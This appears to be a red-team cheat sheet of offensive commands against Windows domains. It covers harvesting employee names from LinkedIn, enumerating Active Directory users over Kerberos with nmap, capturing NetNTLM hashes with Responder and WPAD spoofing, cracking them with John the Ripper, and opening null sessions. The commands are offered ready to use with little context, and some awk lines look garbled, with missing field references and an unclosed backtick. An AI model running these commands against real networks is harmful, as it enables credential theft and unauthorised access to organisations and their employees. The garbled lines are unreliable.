# Red-Team and Infrastructure

## Domain User Enumeration

### Grab employee names from Linkedin

`theharvester -d blah.com -l 1000 -b linkedin`

### Change format to b.lah

`awk '=FS tolower(substr(,1,1)$NF)' linkedin-user-list.txt | awk '{ print   }'`

### Check usernames against AD:

Handy if you have generated a list from linkedin or a list of usernames.

`nmap -p 88 1.1.1.1 --script krb5-enum-users --script-args krb5-enum-users.realm="DOMAIN"`

username list is located at `/usr/local/share/nmap/nselib/data/usernames.lst` in Kali

## Network Attacks 

### Responder

Grab NetNTLM hashes off the network

Without wpad:

`responder -I eth0`

With wpad:

`responder -I eth0 --wpad -b -f -F`

Filter logs from logs folder and remove machine accounts:

`sort -m *.txt | uniq -d | awk '!/\$/'

Cracking with John:

`john SMB-NTLMv2-Client-172.20.22.217.txt --wordlist=/root/passwords.txt`

Use hashcat on a more powerful box. This is only for easy wins.

## Null sessions

Still works on infra that was upgraded.

`net use \\IP_ADDRESS\ipc$ "" /user:""`

